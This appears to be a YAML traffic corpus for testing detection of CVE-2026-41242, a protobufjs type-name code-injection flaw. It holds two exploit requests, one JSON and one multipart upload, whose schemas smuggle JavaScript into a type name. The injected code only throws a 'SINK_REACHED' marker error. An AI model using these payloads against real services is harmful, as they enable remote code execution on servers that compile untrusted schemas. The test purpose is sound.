# Traffic corpus for CVE-2026-41242 (protobufjs type-name code injection)

# App requires a fixed type `User`
# Sink confirmation: throw new Error('SINK_REACHED')

vuln_id: CVE-2026-41242

flows:
  - source: public_exploit
    requests:
      - label: "Basic PoC (Snyk)"
        method: POST
        route: /api/user/decode
        query_string: ""
        headers: { Host: app.example.com, Content-Type: application/json }
        body: '{"schema":{"nested":{"User":{"fields":{"id":{"type":"int32","id":1},"data":{"type":"Data(){throw new Error(''SINK_REACHED'')};function X","id":2}}},"Data(){throw new Error(''SINK_REACHED'')};function X":{"fields":{"content":{"type":"string","id":1}}}}},"data":"CAESBwoFaGVsbG8="}'
        is_exploit: true

      - label: "PoC adapted to upload"
        method: POST
        route: /api/user/decode/upload
        query_string: ""
        headers: { Host: app.example.com, Content-Type: "multipart/form-data; boundary=----pbupload" }
        body: "------pbupload\r\nContent-Disposition: form-data; name=\"schema\"; filename=\"schema.json\"\r\nContent-Type: application/json\r\n\r\n{\"nested\":{\"User\":{\"fields\":{\"id\":{\"type\":\"int32\",\"id\":1},\"data\":{\"type\":\"Data(){throw new Error('SINK_REACHED')};function X\",\"id\":2}}},\"Data(){throw new Error('SINK_REACHED')};function X\":{\"fields\":{\"content\":{\"type\":\"string\",\"id\":1}}}}}\r\n------pbupload\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\nCAESBwoFaGVsbG8=\r\n------pbupload--\r\n"
        is_exploit: true

